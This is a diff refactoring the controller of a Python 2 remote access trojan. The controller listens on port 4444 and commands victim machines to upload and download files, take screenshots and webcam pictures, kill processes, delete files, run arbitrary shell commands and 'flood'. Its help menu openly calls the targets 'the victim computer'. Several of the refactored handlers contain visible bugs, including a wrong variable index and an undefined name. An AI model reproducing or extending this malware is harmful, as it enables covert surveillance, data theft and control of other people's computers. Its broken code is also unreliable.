@@ -14,6 +14,7 @@ class Network:
 		host = ""
 		port = 4444
 
+
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.bind((host, port))
 		s.listen(5)
@@ -54,109 +55,128 @@ class Network:
 		print "{}[+]{} Connected on {}".format(green, default, self.all_addresses[iD])
 		return 0
 
+	def upload(self, cmd, green, red, default):
+		cmdO = cmd.split(" ")
+		c.send("upload")
+		c.recv(1024)
+		try:
+			result = uploadFile(c, cmdO[1], blue, red, green, default, cmdO[2])
+		except IndexError:	
+			result = uploadFile(c, cmdO[1], blue, red, green, default)
+		if result == "T":
+			print "{}[+]{} Upload Complete".format(green, default) 
+		else:
+			print "{}[-]{} ERR".format(red, default)
+
+	def download(self, cmd, green, red, default):
+		cmdO = cmd.split(" ")
+		currentdir = os.getcwd()
+		try:
+			os.chdir(cmdO[2])
+		except WindowsError:
+			print "{}[-]{} '{}' doesn't exist".format(red, default, path)
+			return
+		except IndexError:
+			pass
+			
+		c.send("download")
+		c.recv(1024)
+		result = downloadFile(c, cmd[1],  blue, red, green, default)
+		if result == "T":
+			print "{}[+]{} Download Complete".format(green, default)
+		else:
+			print "{}[-]{} ERR".format(red, default)
+		os.chdir(currentdir)
+
+	def screenshot(self, cmd, green, default):
+		c.send(cmd)
+		c.recv(1024)
+		downloadFile(c, "screenshotFS.png",  blue, red, green, default)
+		print "{}[+]{} Screenshot saved as : '{}/screenshotFS.png'".format(green, default, os.getcwd())
+
+	def printrecv(self, cmd, red, default):
+		c.send(cmd)
+		result = c.recv(2048)
+		if result[:3] == "ERR":
+			print "{}[-]{} {}".format(red, default, result[4:])
+
+	def webcam_snap(self, cmd, blue, red, green, default):
+		c.send(cmd)
+		c.recv(1024)
+		downloadFile(c, "wpicture.png", blue, red, green, default)
+		print "{}[+]{} Picture saved as : {}/wpicture.png".format(green, default, os.getcwd())
+
+	def ls(self, cmd):
+		c.send(cmd)
+		nfile = c.recv(4096)
+		if nfile != "//Nothing//":
+			c.send("pwd")
+			pwd = c.recv(1024)
+			print "\n Contents of : {} \n".format(pwd)
+			print nfile
+
+	def getcmd(self):
+		c.send("pwd")
+		pwd = c.recv(1024)
+		c.send("hostname")
+		hostname = c.recv(1024)
+		return hostname, pwd
+
+	def ps(self, cmd):
+		c.send(cmd)
+		ps = c.recv(16192)
+		if cmd == "ps":
+			print 
+			print " Name                                   Pid"
+			print "------                                 -----"
+
+			print ps
+		else:
+			if ps != "Null":
+				print ps
 
 	def send_command(self, cmd, blue=None, green=None, red=None, default=None):
 		while True:
 			if cmd[:7] == "upload ":
-				cmd = cmd.split(" ")
-				c.send("upload")
-				c.recv(1024)
-				try:
-					result = uploadFile(c, cmd[1], blue, red, green, default, cmd[2])
-				except IndexError:	
-					result = uploadFile(c, cmd[1], blue, red, green, default)
-
-				if result == "T":
-					print "{}[+]{} Upload Complete".format(green, default) 
-				else:
-                                        print "{}[-]{} ERR".format(red, default)
+				self.upload(cmd, green, red, default)
 
 			elif cmd[:9] == "download ":
-				cmd = cmd.split(" ")
-				currentdir = os.getcwd()
-				try:
-					path = cmd[2]
-				except IndexError:
-					path = "None"
-				if path != "None":
-					try:
-						os.chdir(path)
-					except:
-						print "{}[-]{} '{}' doesn't exist".format(red, default, path)
-						return
-				c.send("download")
-				c.recv(1024)
-				result = downloadFile(c, cmd[1],  blue, red, green, default)
-				if result == "T":
-					print "{}[+]{} Download Complete".format(green, default)
-				else:
-					print "{}[-]{} ERR".format(red, default)
-				os.chdir(currentdir)
+				self.download(cmd, green, red, default)
 	
 			elif cmd == "screenshot":
-				c.send(cmd)
-				c.recv(1024)
-				downloadFile(c, "screenshotFS.png",  blue, red, green, default)
-				print "{}[+]{} Screenshot saved as : '{}/screenshotFS.png'".format(green, default, os.getcwd())
+				self.screenshot(cmd, green, default)
 
 			elif cmd == "currentprocess" or cmd[:6] == "force " or cmd == "getpid" or cmd == "sysinfo":
 				c.send(cmd)
 				print c.recv(32768)
 
 			elif cmd[:7] == "force2 " or cmd[:3] == "cd " or cmd[:5] == "kill " or cmd[:3] == "rm " or cmd[:6] == "rmdir ":
-				c.send(cmd)
-				result = c.recv(2048)
-                                if result[:3] == "ERR":
-                                        print "{}[-]{} {}".format(red, default, result[4:])
+				self.printrecv(cmd, red, default)
 
 			elif cmd == "webcam_snap":
-				c.send(cmd)
-				c.recv(1024)
-				downloadFile(c, "wpicture.png", blue, red, green, default)
-				print "{}[+]{} Picture saved as : {}/wpicture.png".format(green, default, os.getcwd())
+				self.webcam_snap(cmd, blue, red, green, default)
 
 			elif cmd == "ls":
-				c.send(cmd)
-				nfile = c.recv(4096)
-				if nfile != "//Nothing//":
-					c.send("pwd")
-					pwd = c.recv(1024)
-					print "\n Contents of : {} \n".format(pwd)
-					print nfile
+				self.ls(cmd)
 
 			elif cmd == "getcmd":
-				c.send("pwd")
-				pwd = c.recv(1024)
-				c.send("hostname")
-				hostname = c.recv(1024)
+				hostname, pwd = self.getcmd()
 				return hostname, pwd
 
-			elif cmd == "ps":
-				c.send(cmd)
-				ps = c.recv(16192)
-				print 
-				print " Name                                   Pid"
-				print "------                                 -----"
-
-				print ps
-
-			elif cmd[:7] == "search ":
-				c.send(cmd)
-				data = c.recv(16192)
-				if data != "Null":
-					print data
+			elif cmd == "ps" or cmd[:7] == "search ":
+				self.ps(cmd)
 
 			else:
 				print "{}[-]{} '{}' is not a valid command type 'help' to see all the valid commands".format(red, default, cmd)
 			return
 
 class Console:
-        def __init__(self):
+	def __init__(self):
 		init()
-                self.green = Fore.GREEN + Style.BRIGHT
-                self.red = Fore.RED + Style.BRIGHT
-                self.blue = Fore.BLUE + Style.BRIGHT
-                self.default = Style.RESET_ALL + Style.BRIGHT
+		self.green = Fore.GREEN + Style.BRIGHT
+		self.red = Fore.RED + Style.BRIGHT
+		self.blue = Fore.BLUE + Style.BRIGHT
+		self.default = Style.RESET_ALL + Style.BRIGHT
 
 		self.Connection = Network()
 
@@ -165,7 +185,7 @@ class Console:
 		print "{}".format(self.blue)
 		bannerfond = random.choice(bannerL)
 		bannerfond()
-                print "{}".format(self.default)
+		print "{}".format(self.default)
 
 
 		t = threading.Thread(target=self.Connection.wait_connections, args=(self.green, self.default, self.blue))
@@ -180,11 +200,11 @@ class Console:
 			
 			elif menu[:9] == "interact ":
 				c = self.Connection.select_client(menu, self.green, self.red, self.default)
-				if c is not None:
+				if c != None:
 					self.winshellI()
 
 			elif menu[:6] == "flood ":
-				arg = menu.split(" ")
+				arg = int(menu.split(" ")[2])
 				try:
 					int(arg[2])
 				except:
@@ -210,6 +230,37 @@ class Console:
 			else:
 				print "{}[-]{} '{}' is not a valid command".format(self.red, self.default, menu)
 
+	def help(self):
+		print
+		print "File System Commands"
+		print "===================="
+		print
+		print " Commands         Description"
+		print " --------         -----------"
+		print " help             help menu"
+		print " upload <arg>     upload a file"
+		print " download <arg>   download a file"
+		print " cd <arg>         change directory"
+		print " ls               list files in current directory"
+		print " rm <arg>         remove file"
+		print " rmdir <arg>      remove directory"
+		print " screenshot       take a screenshot from de victim computer"
+		print " webcam_snap      take a webcam picture from de victim computeur"
+		print
+		print
+		print "System Commands"
+		print "==============="
+		print
+		print " getpid           get the current process id"
+		print " ps               list running processes"
+		print " search <arg>     filter running processes by name"
+		print " currentprocess   get the current process run on the victim computer"
+		print " start <arg>      start a process"
+		print " kill <arg>       terminate the process designated by the PID"
+		print " sysinfo          gets the details about the victim computer"
+		print " force <arg>      force a subprocess.Popen"
+		print " force2 <arg>     force a os.system"
+
 	def winshellI(self):
 		try:
 			while True:
@@ -220,35 +271,7 @@ class Console:
 					continue
 	
 				elif cmd == "help" or cmd == "?":
-					print
-					print "File System Commands"
-					print "===================="
-					print
-					print " Commands         Description"
-					print " --------         -----------"
-					print " help             help menu"
-					print " upload <arg>     upload a file"
-					print " download <arg>   download a file"
-					print " cd <arg>         change directory"
-					print " ls               list files in current directory"
-					print " rm <arg>         remove file"
-					print " rmdir <arg>      remove directory"
-					print " screenshot       take a screenshot from de victim computer"
-					print " webcam_snap      take a webcam picture from de victim computeur"
-					print
-					print
-					print "System Commands"
-					print "==============="
-					print
-					print " getpid           get the current process id"
-					print " ps               list running processes"
-					print " search <arg>     filter running processes by name"
-					print " currentprocess   get the current process run on the victim computer"
-					print " start <arg>      start a process"
-					print " kill <arg>       terminate the process designated by the PID"
-					print " sysinfo          gets the details about the victim computer"
-					print " force <arg>      force a subprocess.Popen"
-					print " force2 <arg>     force a os.system"
+					self.help()
 	
 				elif cmd == "quit":
 					print
@@ -265,3 +288,4 @@ def Main():
 
 if __name__ == '__main__':
 	Main()
+
